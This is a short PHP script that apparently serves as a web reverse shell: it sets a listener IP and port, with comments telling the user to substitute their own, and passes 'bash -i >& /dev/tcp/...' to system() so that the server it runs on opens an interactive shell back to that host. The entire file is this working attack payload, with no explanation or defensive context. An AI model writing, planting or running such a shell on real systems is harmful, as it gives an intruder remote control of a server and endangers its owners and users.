<?php
$ip = '10.17.92.54';  // Replace with your IP address
$port = 5555;      // Replace with the port you want to use
$reverse_shell = "bash -i >& /dev/tcp/$ip/$port 0>&1";
system($reverse_shell);
?>